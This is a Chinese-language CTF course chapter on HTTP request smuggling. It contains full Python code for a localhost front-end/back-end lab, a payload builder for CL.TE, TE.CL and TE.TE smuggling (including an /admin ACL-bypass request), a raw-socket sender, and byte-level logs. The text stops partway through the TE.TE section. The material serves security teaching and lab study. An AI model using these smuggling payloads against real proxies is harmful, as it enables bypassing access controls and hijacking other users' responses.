---
chapter: Web安全
section: HTTP 请求走私与缓存投毒
order: 616
tags:
  - CTF
  - Web安全
  - HTTP走私
  - 缓存投毒
publish: true
---

# W16 HTTP 请求走私与缓存投毒
## HTTP Request Smuggling & Web Cache Poisoning

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L3 进阶期 ｜ **前置要求**：[[10-网络协议基础|10 章]] · [[W01-Web安全导论与HTTP深化|W01]] · [[W02-工具链实战与靶场搭建|W02]]
> **本章目标**：讲清一条 HTTP 请求"在哪里结束"的两种定界方式，以及前端与后端各按自己的方式解释同一段字节流时，分歧如何升级成请求走私（Request Smuggling）；用 Python 原始 socket 自建一对前后端靶，把 CL.TE、TE.CL、TE.TE 三种走私逐种打出两侧的字节日志；在靶上完成两项利用（打穿前端拦截、捕获下一用户的请求头）与三种检测（计数差异、计时、双 TE 探测）；再用一台极简缓存靶打穿 Web 缓存投毒（Web Cache Poisoning），最后汇总防御清单。

> [!note] 本章的实验约定
> 四个自建组件全部用 Python 标准库的原始 socket 手写（[[06-Python与CTF脚本基础|06 章]]的 socket 基础直接用），端口集中在 9600 段：前端 9600、后端 9601、缓存 9602、源站 9603。手写的原因只有一个：==解析策略本身就是本章的研究对象==，必须能对同一段字节指定"按 CL 定界"还是"按 TE 定界"，现成框架的解析器做不到这一点。前端与后端都把**自己实际收到的字节**逐行打印到日志，全程两侧对照。curl 一律带 `--noproxy '*'` 绕过环境代理直连靶机（[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），nc 手发报文的方法见 [[10-网络协议基础#5.4 nc 手发原始 HTTP|10 章 5.4]]。命令与输出成对给出，输出块标题写"输出："。

## 1. 分歧的根源：一条请求在哪里结束

[[10-网络协议基础#5.1 起服务，看一次真实往返|10 章 5.1]] 拆过 HTTP 报文的四段式结构：起始行、头部、空行、体。空行之前的部分两端都看得懂，分歧全在体上——==空行之后还有多少字节属于这条请求，HTTP/1.1 给了两种说法==。

### 1.1 两种定界方式

**第一种：Content-Length**。头部声明体的字节数，读到这个数为止：

```
POST /submit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

name=ctf
```

`Content-Length: 7` 指的是 `name=ctf` 这 7 个**字节**。数的是字节不是字符，行尾的 `\r\n` 每个占 2 字节，`Content-Length: 7\r\n` 这一行自身同样按字节算——手算时漏掉 `\r\n` 是走私请求构造失败的头号原因。

**第二种：Transfer-Encoding: chunked**。体不一次声明长度，而是拆成若干"块"逐个传输，每块先写自己的长度（十六进制），长度为 0 的块表示体到此结束：

```
POST /submit HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

5
name=
3
ctf
0

```

逐字节读：`5\r\n` 声明一个 5 字节的块，块数据是 `name=`，块尾跟一个 `\r\n`；`3\r\n` 再来一个 3 字节的块，数据 `ctf`；`0\r\n\r\n` 是终止块——0 长度，后面再跟一个空行收尾。==体的结束位置由 `0\r\n\r\n` 声明，而不是由任何预设的字节数声明==。体有多长、拆几块，发送方随时决定，这正是它存在的原因（流式生成响应或请求时事先算不出总长）。

两个头也可能**同时出现**。RFC 9112（HTTP/1.1 报文语法的现行规范）的裁决是：Transfer-Encoding 优先，Content-Length 忽略；同时它建议，收到这种报文的实现应当把它当错误处理。对重复的 Content-Length（两个值不一样）、重复的 Transfer-Encoding，规范的态度同样是"应当拒绝"。

### 1.2 RFC 只说"该拒绝"，实现各答各的

规范用了"应当拒绝"（SHOULD），没有规定拒绝之外的第三种情况——如果一个实现**选择不拒绝**，它该按哪种方式解释这条报文，规范没有强制。于是同一个二义报文，不同实现给出的解释可以完全不同：

| 二义情形 | 规范的态度 | 不拒绝的实现各自怎么解释 |
| ---- | ---- | ---- |
| TE 与 CL 并存 | TE 优先，且应当报错 | 有的信 TE，有的信 CL，有的报 400 |
| 重复 Content-Length，值不同 | 应当拒绝 | 取第一个 / 取最后一个 / 报 400 |
| 重复 Transfer-Encoding | 单值头，不应当重复 | 取第一个 / 取最后一个 / 报 400 |
| `Transfer-Encoding : chunked`（冒号前有空格） | 头名与冒号间不允许空白，应当报 400 | 有的剥掉空白认成 TE，有的当成未知头、回退 CL |
| TE 值写法混淆（`xchunked`、`identity, chunked` 等） | 非法值应当报错 | 有的认成 TE，有的忽略、回退 CL |

==这张表的每一行都是一种"合法实现之间的分歧"==——没有哪一方违反了强制规范，它们只是对"该拒绝而未拒绝"的报文给出了不同的解释。W01 第 2 节说过请求头是客户端拼出来的文本；这里更进一步：==连"这段文本定义了多大的一个体"都可以有两种正确答案==。

### 1.3 代理链：分歧升级成漏洞

只有一台服务器时，这些分歧没有受害方——一台服务器怎么解释，请求就怎么被处理。漏洞出现在**两层结构**里：客户端先到前端（CDN、反向代理、负载均衡、WAF），前端再转发给后端应用。为了省去反复握手的开销（[[10-网络协议基础#3.1 三次握手|10 章 3.1]]），前端与后端之间用长连接：一条 TCP 连接上连续走许多条请求，==所有请求的字节首尾相接躺在同一条字节流里，每条请求的边界完全靠定界方式切分==。

现在的分工是：前端从客户端连接上按**自己的**定界方式切出"一条请求"，检查它（ACL、WAF 规则），把这段字节写到后端连接上；后端从这条字节流里按**自己的**定界方式切出请求。两侧策略一旦不同，同一段字节就有了两种切法：

- 前端认为是"请求 1 的体"的字节，后端认为是"请求 1 已经结束、这是下一条请求"——==这段字节从头到尾没经过前端的任何检查==，它是以"体"的身份混进去的，落地却成了一条独立请求；
- 后端多解析出的这条"请求"，会多产生一个响应；前端的账上却没有这条请求，==多出来的响应会被错配给后面排队的真请求==。

这就是 **HTTP 请求走私**：攻击者发一条请求，在后端落地成两条。社区用"前端策略.后端策略"给常见组合命名：**CL.TE**（前端信 CL、后端信 TE）、**TE.CL**（相反）、**TE.TE**（两侧都认 TE，但对重复或混淆的 TE 解释不同）。

## 2. 自建前后端对靶

### 2.1 设计与靶代码

靶的结构：

```
客户端 ──▶ 前端 127.0.0.1:9600 ──(一条长连接)──▶ 后端 127.0.0.1:9601
              │                                        │
              └── /admin 命中 ACL → 403               └── /admin → 200 + flag
              都把自己收到的字节逐行打印到日志
```

前端带一条 ACL 规则：请求行路径以 `/admin` 开头就直接回 403、不转发——模拟"前端拦截了后端才放行的管理路径"。前端与后端之间只有一条长连接，所有客户端的请求按到达顺序排队走它（模拟连接池大小为 1），这是 1.3 节错位能跨客户端扩散的前提。

定界策略做成了启动参数，分歧被显式写进配置：

- `cl`：只认 Content-Length，Transfer-Encoding 写了也当没看见；
- `te`：优先认 Transfer-Encoding，重复 TE 取**最后一个**，值不是 `chunked` 就回退 CL；
- `te_first`：同 `te`，但重复 TE 取**第一个**；
- `te_strict`：同 `te`，但头名冒号前不允许空白（`Transfer-Encoding :` 按未知头处理）。

接收侧必须解决 TCP 的粘包与拆包：一次 `recv` 到多少字节不由应用决定，==读到边界条件满足为止的循环就是解析器的一部分==。下面是靶代码全文（`smuggle_lab.py`）：

```python
#!/usr/bin/env python3
# smuggle_lab.py —— HTTP 请求走私靶：原始 socket 自实现"前端 + 后端"
# 用法：
#   python3 smuggle_lab.py back  9601 te_first    # 后端，监听 9601
#   python3 smuggle_lab.py front 9600 9601 cl     # 前端，监听 9600，转发给 9601
#
# 定界策略（三个名字，分歧全藏在这里）：
#   cl        只认 Content-Length；Transfer-Encoding 写了也当没看见
#   te        优先认 Transfer-Encoding；重复 TE 取最后一个；值不是 chunked 就回退 CL
#   te_first  优先认 Transfer-Encoding；重复 TE 取第一个；值不是 chunked 就回退 CL
#   te_strict 同 te，但头名冒号前不允许有空白（"Transfer-Encoding :" 按未知头处理）
#
# 两个组件都把"自己实际收到的字节"逐行打印到日志，供两侧对照。
import socket
import sys
import threading
import queue
import time

print_lock = threading.Lock()


def log(tag, text=''):
    with print_lock:
        print(f'[{tag}] {text}', flush=True)


def dump(tag, title, data):
    """把字节流按 \r\n 切行后逐行 repr 打印——repr 保证空格、空行都看得见。"""
    log(tag, f'-- {title}（{len(data)} 字节）--')
    for line in data.split(b'\r\n'):
        log(tag, '   ' + repr(line))


class ByteStream:
    """TCP 是字节流：一次 recv 到多少字节不由应用决定（粘包、拆包都可能发生），
    所以接收必须写成循环——边界条件满足或对端关闭才停，剩下的字节留给下一条请求。"""

    def __init__(self, sock):
        self.sock = sock
        self.buf = b''
        self.eof = False

    def until(self, pred):
        while not self.eof and not pred(self.buf):
            chunk = self.sock.recv(4096)
            if not chunk:
                self.eof = True
                break
            self.buf += chunk
        return self.eof

    def take(self, n):
        out, self.buf = self.buf[:n], self.buf[n:]
        return out


def parse_headers(lines):
    headers = []
    for line in lines:
        if b':' not in line:
            continue
        raw_name, value = line.split(b':', 1)
        headers.append({'raw_name': raw_name,
                        'name': raw_name.strip(),
                        'value': value.strip()})
    return headers


def find(headers, name, dup_first):
    name = name.lower()
    hits = [h for h in headers if h['name'].lower() == name]
    if not hits:
        return None
    return hits[0] if dup_first else hits[-1]


def cl_value(headers):
    h = find(headers, b'Content-Length', dup_first=True)
    if h is None:
        return 0
    try:
        return int(h['value'])
    except ValueError:
        return 0


def body_plan(headers, policy):
    """返回 ('cl', 字节数) 或 ('chunked', None)：这条请求的体按什么方式定界。"""
    strict = policy.endswith('_strict')
    base = policy.replace('_strict', '')
    if base == 'cl':
        return ('cl', cl_value(headers))
    # TE 类策略：找 Transfer-Encoding
    te_hits = [h for h in headers
               if h['name'].lower() == b'transfer-encoding'
               and (not strict or h['raw_name'] == h['raw_name'].strip())]
    if te_hits:
        te = te_hits[0] if base == 'te_first' else te_hits[-1]
        if te['value'].lower() == b'chunked':
            return ('chunked', None)
    # 没有 TE，或 TE 值不合法：回退按 CL 定界（有的实现选择直接 400，靶里从简）
    return ('cl', cl_value(headers))


def read_chunked(bs):
    """按块语法消费字节流，返回"实际消费掉的全部字节"（转发时要用原样字节）。"""
    consumed = b''
    while True:
        bs.until(lambda b: b'\r\n' in b)
        idx = bs.buf.index(b'\r\n') + 2
        line = bs.take(idx)
        consumed += line
        size = int(line.split(b';')[0].strip() or b'0', 16)
        bs.until(lambda b: len(b) >= size + 2)   # 块数据 + 块尾的 CRLF
        consumed += bs.take(size + 2)
        if size == 0:
            return consumed


def read_request(bs, policy):
    """从字节流里取一条完整请求，返回 (原始字节, 请求行, 头列表, 体)；
    流里已经没有完整请求时返回 None。"""
    bs.until(lambda b: b'\r\n\r\n' in b)
    if b'\r\n\r\n' not in bs.buf:
        return None
    end = bs.buf.index(b'\r\n\r\n') + 4
    head = bs.take(end)
    lines = head[:-4].split(b'\r\n')
    while lines and lines[0] == b'':      # 容忍请求行前的空行（RFC 9112 允许忽略一个）
        lines.pop(0)
    start = lines[0] if lines else b''
    headers = parse_headers(lines[1:])
    kind, n = body_plan(headers, policy)
    if kind == 'chunked':
        body = read_chunked(bs)
    else:
        bs.until(lambda b: len(b) >= n)
        body = bs.take(n)
    return head + body, start, headers, body


def valid_start(start):
    parts = start.split(b' ')
    return len(parts) == 3 and parts[0] and parts[1].startswith(b'/') and parts[2] == b'HTTP/1.1'


def response(code, phrase, body):
    head = (f'HTTP/1.1 {code} {phrase}\r\n'
            f'Content-Type: text/plain; charset=utf-8\r\n'
            f'Content-Length: {len(body)}\r\n'
            f'Server: lab/0.1\r\n\r\n').encode()
    return head + body


# ---------------- 后端 ----------------

def back_handle(start, headers, body):
    method, path, _ = start.split(b' ', 2)
    if path == b'/':
        return response(200, 'OK', b'HOME PAGE\n')
    if method == b'GET' and path == b'/admin':
        return response(200, 'OK', b'ADMIN PANEL flag{fr0nt_1s_n0t_4_b0und4ry}\n')
    if method == b'GET' and path == b'/probe':
        return response(200, 'OK', b'PROBE\n')
    if method == b'POST' and path == b'/reflect':
        out = b'your body was:\n' + body
        return response(200, 'OK', out)
    return response(404, 'Not Found', b'NOT FOUND\n')


def back_client(conn, policy):
    bs = ByteStream(conn)
    n = 0
    while True:
        req = read_request(bs, policy)
        if req is None:
            break
        raw, start, headers, body = req
        n += 1
        dump('back', f'后端解析出第 {n} 条请求（策略 {policy}）', raw)
        if not valid_start(start):
            log('back', '   请求行无法解析 → 400')
            conn.sendall(response(400, 'Bad Request', b'BAD REQUEST\n'))
            continue
        resp = back_handle(start, headers, body)
        log('back', '   应答: ' + resp.split(b'\r\n')[0].decode())
        conn.sendall(resp)
    conn.close()


def back_serve(port, policy):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', port))
    srv.listen(8)
    log('back', f'后端就绪 127.0.0.1:{port}，定界策略 {policy}')
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=back_client, args=(conn, policy), daemon=True).start()


# ---------------- 前端 ----------------

def read_response(bs):
    bs.until(lambda b: b'\r\n\r\n' in b)
    if b'\r\n\r\n' not in bs.buf:
        return None
    end = bs.buf.index(b'\r\n\r\n') + 4
    head = bs.buf[:end]
    n = 0
    for line in head.split(b'\r\n'):
        if line.lower().startswith(b'content-length:'):
            n = int(line.split(b':', 1)[1])
    bs.until(lambda b: len(b) >= end + n)
    return bs.take(end + n)


def front_client(conn, policy, back_sock, send_lock, resp_q):
    bs = ByteStream(conn)
    n = 0
    try:
        while True:
            req = read_request(bs, policy)
            if req is None:
                break
            raw, start, headers, body = req
            n += 1
            dump('front', f'前端收到客户端第 {n} 条请求（策略 {policy}，原样转发）', raw)
            if not valid_start(start):
                log('front', '   请求行无法解析 → 400')
                conn.sendall(response(400, 'Bad Request', b'BAD REQUEST\n'))
                continue
            path = start.split(b' ')[1]
            if path.startswith(b'/admin'):
                log('front', '   /admin 命中前端 ACL → 不转发，直接回 403')
                conn.sendall(response(403, 'Forbidden', b'FORBIDDEN BY FRONT\n'))
                continue
            with send_lock:
                back_sock.sendall(raw)
            try:
                resp = resp_q.get(timeout=10)
            except queue.Empty:
                log('front', f'   等后端响应超时（第 {n} 条）')
                break
            if resp is None:
                break
            log('front', '   后端响应: ' + resp.split(b'\r\n')[0].decode())
            conn.sendall(resp)
    except (ConnectionError, OSError):
        pass
    finally:
        conn.close()


def front_serve(port, back_port, policy):
    # 到后端只用一条长连接，所有客户端的请求按到达顺序排队走它（模拟连接池大小为 1）
    back_sock = None
    for _ in range(50):
        try:
            back_sock = socket.create_connection(('127.0.0.1', back_port), timeout=0.2)
            back_sock.settimeout(None)     # connect 用的超时不能留给长连接
            break
        except OSError:
            time.sleep(0.1)
    if back_sock is None:
        log('front', f'连不上后端 127.0.0.1:{back_port}')
        return
    log('front', f'前端就绪 127.0.0.1:{port} → 后端 127.0.0.1:{back_port}，定界策略 {policy}')
    log('front', '与后端共用一条长连接（连接池大小 1），请求按到达顺序转发')

    send_lock = threading.Lock()
    resp_q = queue.Queue()

    def relay():
        bs = ByteStream(back_sock)
        while True:
            resp = read_response(bs)
            if resp is None:
                resp_q.put(None)
                return
            resp_q.put(resp)

    threading.Thread(target=relay, daemon=True).start()

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', port))
    srv.listen(8)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=front_client,
                         args=(conn, policy, back_sock, send_lock, resp_q),
                         daemon=True).start()


if __name__ == '__main__':
    role = sys.argv[1]
    if role == 'back':
        back_serve(int(sys.argv[2]), sys.argv[3])
    elif role == 'front':
        front_serve(int(sys.argv[2]), int(sys.argv[3]), sys.argv[4])
```

> [!warning] 前端的转发是"原样字节"
> 真实前端转发前常会改写请求：剥掉 TE 头、把块状体解成定长体再补一个新的 Content-Length（de-chunk），或者按自己的模板重排头部。靶里选择**原样转发**——这让字节记账完全透明：后端收到的就是前端读到的，两侧日志可以直接逐字节对照。改写型前端对构造的影响在 [[#3.5 小结与混淆变体|3.5 节]]的折叠框里讨论。

### 2.2 基线：正常请求的两侧视角

起靶（后端 `te_first`、前端 `cl`，都是单条普通请求时两者没有分歧），发一条 curl：

```bash
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 cl > front.log 2>&1 &
sleep 1
curl -s --noproxy '*' http://127.0.0.1:9600/
```

输出：

```
HOME PAGE
```

```bash
cat front.log back.log
```

输出：

```
[front] 前端就绪 127.0.0.1:9600 → 后端 127.0.0.1:9601，定界策略 cl
[front] 与后端共用一条长连接（连接池大小 1），请求按到达顺序转发
[front] -- 前端收到客户端第 1 条请求（策略 cl，原样转发）（78 字节）--
[front]    b'GET / HTTP/1.1'
[front]    b'Host: 127.0.0.1:9600'
[front]    b'User-Agent: curl/8.18.0'
[front]    b'Accept: */*'
[front]    b''
[front]    b''
[front]    后端响应: HTTP/1.1 200 OK
[back] 后端就绪 127.0.0.1:9601，定界策略 te_first
[back] -- 后端解析出第 1 条请求（策略 te_first）（78 字节）--
[back]    b'GET / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'User-Agent: curl/8.18.0'
[back]    b'Accept: */*'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
```

没有 TE 也没有歧义时，==前端读到的 78 字节与后端解析出的 78 字节一字不差==：一条请求进、一条响应出。接下来三节往这段字节里做手脚。

## 3. 三种走私逐种对照

### 3.1 构造与发送的工具

构造走私请求，==Content-Length 一律用 `len()` 算，不手数==（`smuggle_kit.py`）：

```python
# smuggle_kit.py —— 构造三类走私请求（Content-Length 一律由 len() 算出，不手数）
def head(method, path, extra):
    lines = [f'{method} {path} HTTP/1.1', 'Host: 127.0.0.1:9600'] + extra + ['', '']
    return '\r\n'.join(lines).encode()


def cl_te(smuggled: bytes) -> bytes:
    """CL.TE：前端信 CL、后端信 TE。
    把走私请求整个塞进体里，CL 按"块尾 + 走私请求"的全部字节算；
    TE 头写给后端看，前端（cl 策略）无视它。"""
    body = b'0\r\n\r\n' + smuggled
    return head('POST', '/', [f'Content-Length: {len(body)}',
                              'Transfer-Encoding: chunked']) + body


def te_cl(smuggled: bytes) -> bytes:
    """TE.CL：前端信 TE、后端信 CL。
    走私请求装进一个块的数据区；CL 只数"块大小行"这 4 个字节——
    后端读完自己的体，块数据区里的走私请求就成了它眼里的下一条请求。"""
    chunk_line = f'{len(smuggled):x}'.encode() + b'\r\n'
    body = chunk_line + smuggled + b'\r\n0\r\n\r\n'
    return head('POST', '/', [f'Content-Length: {len(chunk_line)}',
                              'Transfer-Encoding: chunked']) + body


def te_te(smuggled: bytes) -> bytes:
    """TE.TE：重复的 TE 头。前端取最后一个（bogus → 非法 → 回退 CL），
    后端取第一个（chunked）。CL 按"块尾 + 走私请求"算。"""
    body = b'0\r\n\r\n' + smuggled
    return head('POST', '/', [f'Content-Length: {len(body)}',
                              'Transfer-Encoding: chunked',
                              'Transfer-Encoding: bogus']) + body


def plain(path, extra=()):
    return head('GET', path, list(extra))


if __name__ == '__main__':
    S = b'GET /smuggled HTTP/1.1\r\nHost: 127.0.0.1:9600\r\n\r\n'
    A = b'GET /admin HTTP/1.1\r\nHost: 127.0.0.1:9600\r\n\r\n'
    open('clte.raw', 'wb').write(cl_te(S))
    open('tecl.raw', 'wb').write(te_cl(S))
    open('tete.raw', 'wb').write(te_te(S))
    open('clteadmin.raw', 'wb').write(cl_te(A))
    open('clteprobe.raw', 'wb').write(cl_te(b'GET /probe HTTP/1.1\r\nHost: 127.0.0.1:9600\r\n\r\n'))
    open('getroot.raw', 'wb').write(plain('/'))
    open('getprobe.raw', 'wb').write(plain('/probe'))
    # 检测用的探针
    open('clonly.raw', 'wb').write(
        head('POST', '/', ['Content-Length: 5']) + b'0\r\n\r\n')
    big = b'5\r\nAAAAA\r\n0\r\n\r\n'                    # 17 字节的块状体
    open('te_one.raw', 'wb').write(
        head('POST', '/', ['Content-Length: 17',
                           'Transfer-Encoding: chunked']) + big)
    open('te_dup1.raw', 'wb').write(
        head('POST', '/', ['Content-Length: 5',
                           'Transfer-Encoding: chunked',
                           'Transfer-Encoding: bogus']) + big)
    open('te_dup2.raw', 'wb').write(
        head('POST', '/', ['Content-Length: 5',
                           'Transfer-Encoding: bogus',
                           'Transfer-Encoding: chunked']) + big)
    print('raw 文件已写出')
```

发送脚本把原始字节按顺序写进**同一条连接**（走私依赖的就是"后续请求继续走这条连接"），再把收到的响应按 Content-Length 切开编号（`send.py`）：

```python
# send.py —— 在一条连接上按顺序发多个原始请求文件，把收到的响应依次打印
# 用法: python3 send.py 127.0.0.1 9600 req1.raw req2.raw [--delay 0.5] [--timeout 3]
import re
import socket
import sys
import time

args = sys.argv[1:]
host, port = args[0], int(args[1])
rest = args[2:]
delay, timeout, files = 0.5, 3.0, []
i = 0
while i < len(rest):
    if rest[i] == '--delay':
        delay, i = float(rest[i + 1]), i + 2
    elif rest[i] == '--timeout':
        timeout, i = float(rest[i + 1]), i + 2
    else:
        files.append(rest[i])
        i += 1

s = socket.create_connection((host, port))
s.settimeout(timeout)
for k, f in enumerate(files, 1):
    data = open(f, 'rb').read()
    print(f'== 发出请求 #{k}（{f}，{len(data)} 字节）==', flush=True)
    for line in data.split(b'\r\n'):
        print('   ', repr(line), flush=True)
    s.sendall(data)
    if k < len(files):
        time.sleep(delay)

print('== 收到的响应 ==', flush=True)
buf = b''
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
except socket.timeout:
    pass

n, pos = 0, 0
while True:
    j = buf.find(b'\r\n\r\n', pos)
    if j < 0:
        break
    m = re.search(rb'Content-Length: (\d+)', buf[pos:j])
    if m is None:
        break
    end = j + 4 + int(m.group(1))
    n += 1
    print(f'-- 响应 #{n} --', flush=True)
    print(buf[pos:end].decode(errors='replace'), flush=True)
    pos = end
if n == 0:
    print('(一个响应都没等到)', flush=True)
```

### 3.2 CL.TE：前端信 CL，后端信 TE

构造思路（对应 `cl_te()`）：==把走私请求整个塞进请求体里==。体字面值是 `0\r\n\r\n` 加一条完整请求；`Content-Length` 按这批字节的总长声明（53），`Transfer-Encoding: chunked` 写给后端看。前端（`cl` 策略）按 CL 收下全部 53 字节当体，原样转发；后端（`te_first` 策略）按块语法解析——`0\r\n\r\n` 让它在 5 个字节处就认定体结束了，==剩下的 48 字节成了它眼里的下一条请求==。

```bash
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 cl > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 clte.raw getroot.raw
```

输出：

```
== 发出请求 #1（clte.raw，142 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 53'
    b'Transfer-Encoding: chunked'
    b''
    b'0'
    b''
    b'GET /smuggled HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

NOT FOUND
```

第二条明明请求的是 `/`，回来的却是 `NOT FOUND`——==这个 404 是走私请求 `GET /smuggled` 的响应，被错配给了第二条真请求==。两侧日志给出完整证据：

```bash
cat front.log back.log
```

输出：

```
[front] -- 前端收到客户端第 1 条请求（策略 cl，原样转发）（142 字节）--
[front]    b'POST / HTTP/1.1'
[front]    b'Host: 127.0.0.1:9600'
[front]    b'Content-Length: 53'
[front]    b'Transfer-Encoding: chunked'
[front]    b''
[front]    b'0'
[front]    b''
[front]    b'GET /smuggled HTTP/1.1'
[front]    b'Host: 127.0.0.1:9600'
[front]    b''
[front]    b''
[front]    后端响应: HTTP/1.1 200 OK
[front] -- 前端收到客户端第 2 条请求（策略 cl，原样转发）（40 字节）--
[front]    b'GET / HTTP/1.1'
[front]    b'Host: 127.0.0.1:9600'
[front]    b''
[front]    b''
[front]    后端响应: HTTP/1.1 404 Not Found
[back] -- 后端解析出第 1 条请求（策略 te_first）（94 字节）--
[back]    b'POST / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'Content-Length: 53'
[back]    b'Transfer-Encoding: chunked'
[back]    b''
[back]    b'0'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
[back] -- 后端解析出第 2 条请求（策略 te_first）（48 字节）--
[back]    b'GET /smuggled HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 404 Not Found
[back] -- 后端解析出第 3 条请求（策略 te_first）（40 字节）--
[back]    b'GET / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
```

对账：前端收到并转发 **2** 条请求（142 + 40 字节）；后端解析出 **3** 条。第一条在后端只有 94 字节——头 89 字节加块尾 `0\r\n\r\n` 的 5 字节，==`Content-Length: 53` 声明的体在后端只被吃掉 5 个字节==；剩下 48 字节被它切成了第 2 条请求。`GET /smuggled` 没有经过前端（它伪装成体的字节穿过来的），却真实到达了后端。

### 3.3 TE.CL：前端信 TE，后端信 CL

方向反过来：前端按块语法解析，后端按 CL。走私请求这次装进**一个块的数据区**里，`Content-Length` 只声明"块大小行"这 4 个字节（`30\r\n`，`30` 是 48 的十六进制）。前端按块读完整个块状体（块大小行、48 字节块数据、块尾、终止块），原样转发；后端只按 CL 收 4 个字节当体，==块数据区里躺着的走私请求暴露在体的边界之外==。

```bash
pkill -f smuggle_lab.py
python3 smuggle_lab.py back 9601 cl > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 tecl.raw getroot.raw
```

输出：

```
== 发出请求 #1（tecl.raw，147 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 4'
    b'Transfer-Encoding: chunked'
    b''
    b'30'
    b'GET /smuggled HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
    b'0'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

NOT FOUND
```

后端日志（键的两行）：

```bash
cat back.log
```

输出：

```
[back] -- 后端解析出第 1 条请求（策略 cl）（92 字节）--
[back]    b'POST / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'Content-Length: 4'
[back]    b'Transfer-Encoding: chunked'
[back]    b''
[back]    b'30'
[back]    b''
[back]    应答: HTTP/1.1 200 OK
[back] -- 后端解析出第 2 条请求（策略 cl）（48 字节）--
[back]    b'GET /smuggled HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 404 Not Found
[back] -- 后端解析出第 3 条请求（策略 cl）（7 字节）--
[back]    b''
[back]    b'0'
[back]    b''
[back]    b''
[back]    请求行无法解析 → 400
[back] -- 后端解析出第 4 条请求（策略 cl）（40 字节）--
[back]    b'GET / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
```

后端只认 `Content-Length: 4`：体是 `30\r\n`（日志第 1 条的 92 字节 = 头 88 + 体 4）。==数据区里那条走私请求原样落在体边界之后，成了第 2 条请求==。随后连块状框架自己的残余 `0\r\n\r\n` 都被它当成新请求去解析（第 3 条，请求行 `0`，400）——这不是故障，==字节错位之后，连定界符本身都会被当成业务数据==。客户端只收到 2 个响应（HOME、NOT FOUND），后端实际产生了 4 个：多出的 2 个滞留在前端的响应队列里，==会错配给这条后端连接上的后续请求==。

### 3.4 TE.TE：重复头的归属分歧

两侧都声明"我优先认 TE"，但对**重复的 TE 头取哪一个**做了相反的选择：前端取最后一个（`bogus`，非法值，回退 CL），后端取第一个（`chunked`）。请求体与 3.2 节完全相同（`0\r\n\r\n` + 走私请求，CL: 53）：

```bash
pkill -f smuggle_lab.py
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 tete.raw getroot.raw
```

输出：

```
== 发出请求 #1（tete.raw，168 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 53'
    b'Transfer-Encoding: chunked'
    b'Transfer-Encoding: bogus'
    b''
    b'0'
    b''
    b'GET /smuggled HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

NOT FOUND
```

后端日志的关键两行：

```bash
cat back.log
```

输出：

```
[back] -- 后端解析出第 1 条请求（策略 te_first）（120 字节）--
[back]    b'POST / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'Content-Length: 53'
[back]    b'Transfer-Encoding: chunked'
[back]    b'Transfer-Encoding: bogus'
[back]    b''
[back]    b'0'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
